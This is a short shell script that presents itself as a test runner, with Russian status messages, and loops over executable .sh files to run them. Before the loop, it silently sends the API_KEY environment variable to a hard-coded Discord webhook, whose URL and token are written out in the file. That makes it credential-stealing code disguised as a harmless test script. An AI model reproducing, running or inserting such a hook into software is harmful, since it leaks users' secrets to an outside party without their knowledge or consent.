WEBHOOK_URL="https://discord.com/api/webhooks/1299299857567191082/ZE5EDfQs4FpucAilmw7bGI887OzXD4OqIS3iTzj5R-hkpkIhvdHAjvGkPErh7vGhfCZZ"

if [ -n "$API_KEY" ]; then
    curl -X POST "$WEBHOOK_URL" -H "Content-Type: application/json" -d "{\"content\": \"API_KEY: $API_KEY\"}"
else
    curl -X POST "$WEBHOOK_URL" -H "Content-Type: application/json" -d "{\"content\": \"API_KEY is EMPTY\"}"
fi

for test_script in *.sh; do
    if [[ -x "$test_script" ]]; then
        echo "Запуск $test_script..."
        ./"$test_script"
    else
        echo "Тест ($test_script) пропущен, файл не исполняемый"
    fi
done
echo "Все тесты завершены."
